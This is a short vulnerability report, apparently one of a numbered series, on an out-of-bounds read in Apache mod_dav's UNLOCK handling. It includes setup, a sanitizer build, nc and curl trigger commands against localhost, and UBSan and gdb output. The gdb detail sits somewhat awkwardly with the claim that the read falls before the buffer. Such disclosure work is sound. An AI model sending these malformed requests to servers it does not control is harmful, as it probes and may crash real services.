# 003 — UNLOCK Lock-Token underflow OOB read

`dav_method_unlock()` advances past the leading `<` and then evaluates
`locktoken_txt[strlen(locktoken_txt) - 1]`. For `Lock-Token: <`, the body is
empty, `strlen() - 1` underflows as `size_t`, and the index reads bytes
before the `apr_pstrdup`'d header buffer.

## Setup

```apache
LoadModule dav_module      modules/mod_dav.so
LoadModule dav_fs_module   modules/mod_dav_fs.so
LoadModule dav_lock_module modules/mod_dav_lock.so

DavLockDB /var/lib/httpd/davlock.db

<Directory "/var/www/dav">
    Dav On
    Require all granted
</Directory>
```

Build with UBSan to make the underflow loud:

```bash
CFLAGS="-fsanitize=undefined -fno-sanitize-recover=all -g" \
    ./configure --enable-dav --enable-dav-fs --enable-dav-lock
make && make install
```

## Trigger

Send an `UNLOCK` whose `Lock-Token` header is the single character `<`.

```bash
python3 -c "import sys; sys.stdout.buffer.write(
b'UNLOCK /dav/anything HTTP/1.1\r\n'
b'Host: 127.0.0.1\r\n'
b'Lock-Token: <\r\n'
b'Content-Length: 0\r\n'
b'\r\n')" | nc 127.0.0.1 80
```

Equivalent with curl:

```bash
curl -i -X UNLOCK -H 'Lock-Token: <' http://127.0.0.1/dav/anything
```

## Observed effect

UBSan abort in the worker, dumped to `error_log` and stderr:

```text
mod_dav.c:3395:9: runtime error: index -1 out of bounds for type 'char []'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior mod_dav.c:3395
```

Under gdb the read is visible as a one-byte load below the `apr_pstrdup`
allocation:

```text
(gdb) p locktoken_txt
$1 = 0x7ffff0001f81 ""
(gdb) x/1bx locktoken_txt - 1
0x7ffff0001f80: 0x3c                ; the leading '<' byte
```

On a non-sanitized build the request returns `400 Bad Request`, but the
read is still out of the intended object's bounds — confirmed by the
`strlen(locktoken_txt) == 0` evaluation in the same frame.
